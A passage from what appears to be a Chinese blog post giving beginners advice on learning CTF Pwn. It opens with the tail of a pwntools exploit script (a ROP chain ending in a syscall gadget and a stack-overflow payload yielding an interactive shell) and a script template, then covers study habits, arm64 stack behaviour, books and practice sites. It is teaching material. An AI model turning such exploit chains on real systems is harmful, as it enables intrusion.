class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004230a6</span>) <span class="hljs-comment"># syscall ; re</span><br>	<span class="hljs-keyword">return</span> p<br><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span>+<span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span>+rop()<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>整个过程一般来说没有什么可以取巧的地方，但在编写脚本时可以提前自己准备好一份框架模板，在用的时候只需要修改文件名就能直接上手，这会避免些许时间浪费。</p>
<p>比如这样，提前将要用到的函数简化等：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span> <br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span> <br>p=process(<span class="hljs-string">&#x27;./your_binary&#x27;</span>)<br><br>ru = <span class="hljs-keyword">lambda</span> a: p.readuntil(a)<br>r = <span class="hljs-keyword">lambda</span> n: p.read(n)<br>sla = <span class="hljs-keyword">lambda</span> a,b: p.sendlineafter(a,b) <br>sa = <span class="hljs-keyword">lambda</span> a,b: p.sendafter(a,b) <br>sl = <span class="hljs-keyword">lambda</span> a: p.sendline(a) <br>s = <span class="hljs-keyword">lambda</span> a: p.send(a) <br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说，这道题目并不困难，笔者相信对大多数师傅来说都是非常简单的一道题。但是本文既然面向即将开始入门这个方向的师傅，如果全文都是在讲述极其复杂的理解和利用，相信这会让大多数人望而却步。如果您真的期望看一些较为复杂的内容，籍此提前了解一下未来会遇到哪些麻烦的问题，欢迎您浏览笔者的博客和某些论坛的主页。</p>
<p>归根结底，笔者在此还算希望能减轻师傅们对 PWN 的一些畏难心理。因为笔者最开始学 PWN 的时候也会因为见到不认识的内容感到无从下手，从而放弃整道题目，而在事后看完 writeup 又觉得追悔莫及。</p>
<h2 id="Q3-学习过程中有没有什么重难点需要注意？"><a href="#Q3-学习过程中有没有什么重难点需要注意？" class="headerlink" title="Q3:学习过程中有没有什么重难点需要注意？"></a>Q3:学习过程中有没有什么重难点需要注意？</h2><p>学 Pwn 最忌讳的就是“怕麻烦”。很多时候可能看反编译出来的伪代码难以理解，但其实上手调试一下就能解决。而克服自己怕麻烦的心态其实就是 Pwn 的成长路途上几大麻烦之一。</p>
<p>另外一个点则是“有耐心”。尤其是对于刚入门不久的师傅们来说，Pwn 的做题流程相比于其他方向都显得更加的冗长，有的时候连第一步的环境搭建都要折腾上几个小时之久，还会面临各种各样极其麻烦的场景，因此对 Pwn 手来说，耐心是一个很关键的要素，一方面在做题时保持心态才能够稳定输出，另一方面只有长期保持兴趣才能在 Pwn 的道路上越走越远。</p>
<p>除此之外，在技术上的重难点就是对技术的适应性。随着现在 CTF 比赛越来越多，题型和技术栈也是越来越繁茂了，如何在遇到新型的题目设计时尽快适应也是一个重难点。举个简单的例子，对于做惯了 x86_64 下 C 语言赛题的师傅，如果突然给出了一道 arm64 Pwn 的题目，又或者是 Rust 编写的题目时，如何快速的适应题目并展开分析就变得重要了。</p>
<p>以我的个人经验来说，要想快速适应新的题型，往往需要通过大量的赛前积累。这并不意味着靠题海战术解决，而是通过不同的类型赛题去培养自己的直觉，养成了一个良好的意识习惯以后，自然就对各类题型都不会觉得梗塞了。</p>
<p>以 Arm64 架构举例：做惯了 x86_64 架构的师傅都知道，x86_64 是基于栈和寄存器的架构，这意味着栈溢出能够劫持它的运行逻辑。现在我们切换到 arm64 ，通过资料可以查阅出，它是一款基于寄存器的架构。在 x64 下，call 一个函数时会将返回地址入栈，而 arm64 肯定也要具备函数调用的能力，那么它的函数调用是如何实现的？</p>
<p>通过搜索可以找到如下样例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.text<br>.global _funcA, _sum<br><br>_funcA:<br>    stp x29, x30, [sp, #-0x10]!<br>    bl _sum<br>    ldp x29, x30, [sp], #0x10<br>    ret<br><br>_sum:<br>    add x0, x0, x1<br>    ret<br></code></pre></td></tr></table></figure>

<p>可以发现它使用了 x29 和 x30 两个寄存器，再往下查找资料可以发现而这分别用于储存栈帧和返回地址。而在嵌套式调用中，调用以前会将当前函数的返回地址和栈帧入栈，这就相当于 x64 下的 <code>push rbp;push rip+8</code> 了，因此栈溢出对它仍然适用，只是覆盖的返回地址不能够立即劫持，需要等待当前函数返回后，将劫持的返回地址加载到 x30，并且当父函数再次返回时才能够劫持。以及中间需要选择其他 gadget 对栈进行维护从而构造 ROP 进行持续控制。</p>
<p>此处，笔者所说的 “直觉” 其实指的就是在遇到该架构时能够先考虑到理解函数调用和栈的关系这一点，从此处开始向下搜索资料来完善自己的猜测，最后验证猜测。</p>
<p>当然直觉也是失灵的时候，在失灵时能够尽快提出另一种可能性也是一种灵活。</p>
<h2 id="Q4-有哪些值得推荐的书籍或网站？"><a href="#Q4-有哪些值得推荐的书籍或网站？" class="headerlink" title="Q4:有哪些值得推荐的书籍或网站？"></a>Q4:有哪些值得推荐的书籍或网站？</h2><h3 id="书单"><a href="#书单" class="headerlink" title="书单"></a>书单</h3><p>首先先推荐一下这个项目：<a target="_blank" rel="noopener" href="https://github.com/olist213/Information_Security_Books%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%9F%BA%E6%9C%AC%E4%B8%8A%E6%B6%B5%E7%9B%96%E4%BA%86%E6%AF%8F%E4%B8%AA%E6%96%B9%E5%90%91%E7%9A%84%E7%9B%B8%E5%85%B3%E4%B9%A6%E7%B1%8D%EF%BC%8C%E8%AF%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E6%8C%89%E9%9C%80%E8%87%AA%E5%8F%96%E3%80%82">https://github.com/olist213/Information_Security_Books，里面基本上涵盖了每个方向的相关书籍，读者可以按需自取。</a></p>
<p>然后是笔者为 Pwn 师傅们推荐的单独目录：</p>
<ul>
<li>操作系统(B)：《操作系统真象还原》《鸟哥的Linux私房菜》</li>
<li>计算机原理(B)：《深入理解计算机系统(CSAPP)》，《程序员的自我修养》</li>
<li>C&#x2F;C++ (A)：《C Primer plus》《C++ Primer plus》</li>
<li>汇编语言(A)：《汇编语言》- 王爽</li>
<li>数据结构(C-)：《数据结构与算法分析 —— C语言描述》</li>
<li>网络协议(C)：《TCP&#x2F;IP 详解 (卷一)》</li>
<li>逆向工程(D)：《逆向工程核心原理》</li>
<li>编译原理(D)：《编译原理(龙书)》</li>
</ul>
<p>操作系统是每位 Pwner 必备的基础知识，哪怕不准备往内核方向发展，这两部书也是有必要看的，其中第一本能在极大程度上驱散自己对计算机核心的心中迷雾。而第二本则是辅助，如果有时间可以看看。</p>
<p>计算机原理则是另外一部分必要内容，CSAPP 不要求全都看完，个人认为看到 11 章就非常足够了，而 Lab 只需要做到 Lab4 就能在很大程度上满足需求了。当然，如果有时间，自然是越多越好。而《程序员的自我修养》则在另外一个方面弥补自己对软件构建方面的缺陷，这本书不厚，很快就能看完，但非常推荐去看看。</p>
<p>C&#x2F;C++ 则是必要的语言基础，我个人认为，C 语言一定要学好，而其他语言的最低限度是能够会看即可。由于大部分语言都有自己的语义结构，因此从字面上理解往往并没有那么困难，我个人认为对于其他语言可以浅尝辄止，但 C 语言一定要学的足够深。</p>
<p>数据结构部分其实并不是那么关键，尽管几乎所有计算机类都会有这么一门必修课，但实际上用到的机会并不是那么多。但我仍然推荐各位对此稍微有些了解，因为数据结构中的很多实现往往较为晦涩，如果没有自己编写类似代码的经验，在对此类题目进行逆向分析时会吃上些许苦头。</p>
<p>网络协议部分也是较为关键的内容，因为 Pwn 的目标在现实场景下其实涉及到网络组件的情况更多，掌握这部分知识会让分析代码的过程更丝滑。</p>
<p>逆向工程和编译原理相对来要求没那么高，在已经完成了前面所说的部分以后如果仍有余裕，可以考虑这部分内容作为额外的提升。</p>
<p>至于阅读顺序，个人是建议按照上述目录标准的顺序，从 A-D 递减的优先级进行阅读。</p>
<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><ul>
<li>CTF-wiki : <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">https://ctf-wiki.org/pwn/linux/user-mode/environment/</a></li>
<li>BUUOJ：<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a></li>
</ul>
<p>对大多数人来说，CTF-wiki 可以解决入门阶段 90% 的基础，而 BUUOJ 和一些其他的练习平台作为辅助，闲暇的时候刷上一两题巩固基础，提高熟练度。</p>
<p>就我个人而已，我更推荐以赛促学，练习更多的只是平常用于巩固，刷上 2-3 页其实就很多了。更加高效的方法是参加一些难度并没有那么高的比赛，在那种连续的环境下长时间思考能够快速提高自己的技术水平。比如说安恒的月赛、各大高校的新生赛，都是不错的选择。</p>
<h2 id="Q5-如果我要学-Pwn-有没有什么建议？"><a href="#Q5-如果我要学-Pwn-有没有什么建议？" class="headerlink" title="Q5:如果我要学 Pwn ,有没有什么建议？"></a>Q5:如果我要学 Pwn ,有没有什么建议？</h2><p>Pwn 其实是一门较为综合的方向，它的实际范围其实要比我们在比赛中能够遇见的更广，这决定了它注定不是一条轻松的路。二进制安全的历史其实非常久远，很多东西已经非常完善了。比方说现在的 Rust 语言就在很大程度上解决了内存安全问题，所以它越是发展，我们就越是没事做。安全行业的实质是在消灭安全行业，所以为了求生，除了比赛相关的内容以外，也建议师傅们对自己设立一些更高的目标。</p>
<p>学 Pwn 的目的不只是为了在比赛里能拿个好成绩，更不应该是因为队伍里没人学所以自己补个位，认清楚自己的目标，提前想好自己在未来能够用它做些什么才是更重要的事情。</p>
<h1 id="实践经历"><a href="#实践经历" class="headerlink" title="实践经历"></a>实践经历</h1><h2 id="Q1-理论与现实的差距在哪？"><a href="#Q1-理论与现实的差距在哪？" class="headerlink" title="Q1:理论与现实的差距在哪？"></a>Q1:理论与现实的差距在哪？</h2><p>仅限于 Pwn 方向来说，CTF 和实际的工作内容的差距是非常大的。从最基本的性质上说，CTF 的本质是 Game，Game 就肯定有通关的方法，也就是说题目必然是有解的，但现实里挖洞却不一样，有的时候它可能真的没洞，又有的时候或许漏洞过于隐蔽以至于自己无法判断是否能够挖出。</p>
<p>我相信大多数师傅在做题的时候都很少会接触到超过 1mb 大小的 Pwn 题，现在因为 Rust 和 Golang 等语言的出现，二进制文件可能相比以前的 C 语言大上不少，但一般都不会超过 10mb(排除静态编译的情况)。但在真正的工作里，我们有可能要面对远大于这个量级的样本，可能一个样本有 20mb 甚至更大，函数的数量超过十万个，在这种条件下，按照做 Pwn 题的方式去分析样本几乎是不可能完成的任务。</p>
<p>也有一些相对苛刻的情况，可能做过 IOT 的师傅会更清楚，模拟设备和真实设备的差距是很大的，对于一些特殊设备可能根本没办法进行模拟，这就更加麻烦了。</p>
<h2 id="Q2-那我该怎么办呢？"><a href="#Q2-那我该怎么办呢？" class="headerlink" title="Q2:那我该怎么办呢？"></a>Q2:那我该怎么办呢？</h2><p>正如上文所说的，拓宽自己的技能栈。Pwn 的总体方向是 “二进制漏洞挖掘与利用”，其中包括了挖掘部分。CTF 中其实有意削弱了这漏洞挖掘的部分，因为对于限时的比赛而言，挖洞往往耗费大量的时间且并不体现选手的能力，因为有的时候，能否挖出漏洞甚至是一个运气问题。</p>
<p>那么弥补这部分靠 CTF 无法学到的知识就可以了。常用的漏洞挖掘的方案一般包括黑盒测试、灰盒测试和白盒测试，掌握这方面的技巧，参考一些比较经典的项目，比如 AFLFuzzer、Codeql 等，能够在很大程度上弥补这方面知识。</p>
<p>当然，最终都要落到实处。尝试着去找一些相对简单的项目进行真正的漏洞挖掘，亲身体验一下那种过程要远好于各种资料。</p>
<p>如果在过程中遇到了自己难以解决的问题，比起自己埋头硬干，也建议各位师傅积极与其他师傅交流，各大比赛的官方群在赛后其实都是不错的交流平台，以及一些 Pwner 交流群和各大论坛都能提供一定的帮助。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>不知道各位有没有发现，我似乎总是倾向于用文字而非图片或其他形式进行表达。</p>
<p>由于我在编写文档时总是习惯用 <code>markdown</code> 这种标记语言进行编辑，这种文档显示出来的效果会因不同的编辑器而异，所以尽管 <code>Obsidian</code> 的风格非常优雅，但为了兼容性考虑，我还是在大多数时候避免使用表格和图片，后者主要是因为图片的非常耗时。出于种种考虑，如果您希望以一种快捷的方式撰写文档，我也推荐您使用 <code>markdown</code> 代替 word 文档。</p>
<p>最后再贴个自己的小博客：<strong>tokameine.top</strong> </p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/07/%E8%87%AA%E6%88%91%E7%9A%84%E5%BC%B1%E7%82%B9/">← 下一篇 自我的弱点</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/28/Frida-Core-%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E8%A7%A3%E8%AF%BB/">Frida-Core 源代码分析解读 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#How-to-do"><span class="toc-number">2.</span> <span class="toc-text">How to do</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Q1-%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E6%89%8D%E7%AE%97%E5%85%A5%E9%97%A8"><span class="toc-number">2.1.</span> <span class="toc-text">Q1:到底什么时候才算入门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q2-%E6%88%91%E5%AD%A6%E5%AE%8C%E4%BA%86%E5%9F%BA%E7%A1%80%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E6%84%9F%E8%A7%89%E7%9C%8B%E9%A2%98%E6%97%B6%E8%BF%98%E6%98%AF%E5%BE%88%E8%BF%B7%E8%8C%AB"><span class="toc-number">2.2.</span> <span class="toc-text">Q2:我学完了基础，为什么感觉看题时还是很迷茫</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E9%A2%98%E7%9B%AE%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83-%E8%BF%90%E8%A1%8C%E7%9A%84%E5%B9%B3%E5%8F%B0-%E5%8A%A8%E6%80%81%E5%BA%93%E7%89%88%E6%9C%AC%E7%AD%89"><span class="toc-number">2.2.1.</span> <span class="toc-text">- 确认题目的运行环境 - 运行的平台&#x2F;动态库版本等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%90%86%E8%A7%A3%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91"><span class="toc-number">2.2.2.</span> <span class="toc-text">- 反编译二进制文件静态分析理解代码逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#case1"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">case1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#case2"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">case2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#case3"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">case3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#case4"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">case4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#case5"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">case5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.2.6.</span> <span class="toc-text">漏洞发现与利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8"><span class="toc-number">2.2.3.</span> <span class="toc-text">- 动态调试验证漏洞存在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC-%E8%B0%83%E8%AF%95%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.4.</span> <span class="toc-text">- 编写脚本+调试进行利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q3-%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E9%87%8D%E9%9A%BE%E7%82%B9%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%EF%BC%9F"><span class="toc-number">2.3.</span> <span class="toc-text">Q3:学习过程中有没有什么重难点需要注意？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q4-%E6%9C%89%E5%93%AA%E4%BA%9B%E5%80%BC%E5%BE%97%E6%8E%A8%E8%8D%90%E7%9A%84%E4%B9%A6%E7%B1%8D%E6%88%96%E7%BD%91%E7%AB%99%EF%BC%9F"><span class="toc-number">2.4.</span> <span class="toc-text">Q4:有哪些值得推荐的书籍或网站？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%A6%E5%8D%95"><span class="toc-number">2.4.1.</span> <span class="toc-text">书单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">2.4.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q5-%E5%A6%82%E6%9E%9C%E6%88%91%E8%A6%81%E5%AD%A6-Pwn-%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E5%BB%BA%E8%AE%AE%EF%BC%9F"><span class="toc-number">2.5.</span> <span class="toc-text">Q5:如果我要学 Pwn ,有没有什么建议？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%8F%E5%8E%86"><span class="toc-number">3.</span> <span class="toc-text">实践经历</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Q1-%E7%90%86%E8%AE%BA%E4%B8%8E%E7%8E%B0%E5%AE%9E%E7%9A%84%E5%B7%AE%E8%B7%9D%E5%9C%A8%E5%93%AA%EF%BC%9F"><span class="toc-number">3.1.</span> <span class="toc-text">Q1:理论与现实的差距在哪？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q2-%E9%82%A3%E6%88%91%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%E5%91%A2%EF%BC%9F"><span class="toc-number">3.2.</span> <span class="toc-text">Q2:那我该怎么办呢？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">4.</span> <span class="toc-text">结语</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" 